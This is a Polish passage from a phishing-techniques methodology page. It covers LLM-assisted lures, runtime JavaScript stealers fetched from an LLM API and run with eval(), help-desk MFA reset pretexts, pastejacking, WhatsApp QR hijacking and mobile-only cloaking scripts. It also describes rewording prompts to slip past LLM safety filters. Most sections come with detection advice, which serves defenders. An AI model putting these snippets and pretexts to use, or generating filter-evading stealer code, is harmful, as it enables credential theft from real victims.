Atakujący łączą obecnie **API LLM i klonowania głosu**, aby tworzyć w pełni spersonalizowane przynęty i prowadzić interakcję w czasie rzeczywistym.

| Warstwa | Przykładowe zastosowanie przez threat actor |
|-------|-------------|
|Automatyzacja|Generowanie i wysyłanie >100 tys. wiadomości e-mail / SMS z losowym sformułowaniem i linkami śledzącymi.|
|Generative AI|Tworzenie *jednorazowych* wiadomości e-mail nawiązujących do publicznych transakcji M&A i wewnętrznych żartów z social media; deepfake głosu CEO w scamie z oddzwonieniem.|
|Agentic AI|Autonomiczne rejestrowanie domen, zbieranie informacji z open source oraz tworzenie wiadomości kolejnego etapu, gdy ofiara kliknie, ale nie prześle danych uwierzytelniających.|

**Obrona:**
• Dodaj **dynamiczne banery** wyróżniające wiadomości wysłane z niezaufanej automatyzacji (na podstawie anomalii ARC/DKIM).
• Wdróż **frazy wyzwań biometrycznych głosu** dla rozmów telefonicznych wysokiego ryzyka.
• Stale symuluj przynęty generowane przez AI w programach podnoszenia świadomości – statyczne szablony są przestarzałe.

Zobacz także – nadużywanie agentic browsing do phishingu danych uwierzytelniających:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Zobacz także – nadużywanie przez agentów AI lokalnych narzędzi CLI i MCP (do inwentaryzacji sekretów i detekcji):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Wspomagane przez LLM składanie phishingowego JavaScriptu w czasie działania (codegen w przeglądarce)

Atakujący mogą dostarczyć wyglądający nieszkodliwie HTML i **generować stealera w czasie działania**, prosząc **zaufane API LLM** o JavaScript, a następnie wykonując go w przeglądarce (np. za pomocą `eval` lub dynamicznego `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt jako obfuskacja:** kodowanie URL-i eksfiltracji/ciągów Base64 w prompcie; iteracyjne zmienianie sformułowań w celu ominięcia filtrów bezpieczeństwa i ograniczenia halucynacji.
2. **Wywołanie API po stronie klienta:** podczas ładowania JS wywołuje publiczny LLM (Gemini/DeepSeek/itp.) lub proxy CDN; w statycznym HTML znajduje się wyłącznie prompt/wywołanie API.
3. **Złożenie i wykonanie:** konkatenacja odpowiedzi i wykonanie jej (polimorficznie przy każdej wizycie):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** wygenerowany kod personalizuje przynętę (np. parsowanie tokenu LogoKit) i wysyła dane uwierzytelniające do ukrytego w promptcie endpointu.

**Cechy utrudniające wykrycie**
- Ruch trafia do dobrze znanych domen LLM lub renomowanych proxy CDN, czasami przez WebSockets do backendu.
- Brak statycznego payloadu; złośliwy JS istnieje dopiero po renderowaniu.
- Niedeterministyczne generowanie tworzy **unikalne stealery dla każdej sesji**.

**Pomysły na wykrywanie**
- Uruchamiaj sandboxy z włączonym JS; oznaczaj **runtime `eval`/dynamiczne tworzenie skryptów pochodzące z odpowiedzi LLM**.
- Wyszukuj żądania POST z front-endu do API LLM, po których bezpośrednio następuje `eval`/`Function` na zwróconym tekście.
- Generuj alerty dla niezatwierdzonych domen LLM w ruchu klienta, po których następują żądania POST z danymi uwierzytelniającymi.

---

## Wariant MFA Fatigue / Push Bombing – Forced Reset
Oprócz klasycznego push-bombingu operatorzy po prostu **wymuszają nową rejestrację MFA** podczas rozmowy z help deskiem, unieważniając istniejący token użytkownika. Każdy kolejny prompt logowania wygląda dla ofiary wiarygodnie.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitoruj zdarzenia AzureAD/AWS/Okta, w których **`deleteMFA` + `addMFA`** występują **w ciągu kilku minut z tego samego adresu IP**.



## Clipboard Hijacking / Pastejacking

Atakujący mogą potajemnie skopiować złośliwe polecenia do schowka ofiary ze zhakowanej lub typosquatted strony internetowej, a następnie nakłonić użytkownika do wklejenia ich w **Win + R**, **Win + X** lub oknie terminala, wykonując dowolny kod bez pobierania pliku ani załącznika.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing i dystrybucja złośliwych aplikacji (Android i iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Przejęcie linkowania urządzenia WhatsApp za pomocą QR i social engineering
* Strona przynęta (np. fałszywy „kanał” ministerstwa/CERT) wyświetla kod QR WhatsApp Web/Desktop i instruuje ofiarę, aby go zeskanowała, potajemnie dodając atakującego jako **linked device**.<sup>[[12]](#references)</sup>
* Atakujący natychmiast uzyskuje wgląd w czaty i kontakty, dopóki sesja nie zostanie usunięta. Ofiary mogą później zobaczyć powiadomienie „new device linked”; defenderzy mogą wyszukiwać nieoczekiwane zdarzenia linkowania urządzeń krótko po odwiedzeniu niezaufanych stron z kodami QR.

### Mobile-gated phishing w celu omijania crawlerów/sandboxów
Operatorzy coraz częściej ukrywają swoje przepływy phishingowe za prostym sprawdzeniem urządzenia, aby crawlery desktopowe nigdy nie docierały do stron końcowych. Typowy schemat obejmuje niewielki skrypt, który sprawdza, czy DOM obsługuje dotyk, i przesyła wynik do endpointu serwera; klienci niemobilni otrzymują HTTP 500 (lub pustą stronę), podczas gdy użytkownikom urządzeń mobilnych udostępniany jest pełny przepływ.<sup>[[7]](#references)</sup>

Minimalny fragment po stronie klienta (typowa logika):
```html
<script src="/static/detect_device.js"></script>
```
Logika `detect_device.js` (uproszczona):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Często obserwowane zachowanie serwera:
- Ustawia cookie sesji podczas pierwszego ładowania.
- Akceptuje `POST /detect {"is_mobile":true|false}`.
- Zwraca 500 (lub placeholder) dla kolejnych żądań GET, gdy `is_mobile=false`; udostępnia phishing tylko wtedy, gdy `true`.

Heurystyki wyszukiwania i detekcji:
- Zapytanie urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria webowa: sekwencja `GET /static/detect_device.js` → `POST /detect` → HTTP 500 dla urządzeń innych niż mobilne; prawidłowe ścieżki ofiar mobilnych zwracają 200 z następującym HTML/JS.
- Blokuj lub analizuj strony, które warunkują zawartość wyłącznie na podstawie `ontouchstart` lub podobnych kontroli urządzenia.

Wskazówki dotyczące obrony:
- Uruchamiaj crawlery z fingerprintami podobnymi do urządzeń mobilnych i włączonym JS, aby ujawnić treść za kontrolą dostępu.
- Generuj alerty dotyczące podejrzanych odpowiedzi 500 następujących po `POST /detect` w nowo zarejestrowanych domenach.

## References

- [1] [Generowanie wariantów domen używanych w phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Wykrywanie phishingu: narzędzia i techniki (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kradzież danych uwierzytelniających i omijanie 2FA za pomocą noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Kradzież sesji i omijanie 2FA za pomocą EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jak zainstalować i skonfigurować DKIM z Postfix na Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globalny raport Unit 42 dotyczący reagowania na incydenty z 2025 r. – edycja poświęcona inżynierii społecznej](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infrastruktura phishingowa z ograniczeniem do urządzeń mobilnych i heurystyki (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Kolejna granica ataków polegających na składaniu w czasie działania: wykorzystanie LLM do generowania JavaScriptu phishingowego w czasie rzeczywistym](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Podszywanie się, przejmowanie kliknięć i TDS: analiza ekosystemu dystrybucji malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Przejmowanie ruchu do windows.com firmy Microsoft za pomocą bit flipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Miłość? Właściwie: fałszywa aplikacja randkowa wykorzystana jako przynęta w ukierunkowanej kampanii spyware w Pakistanie](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoC i próbki ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
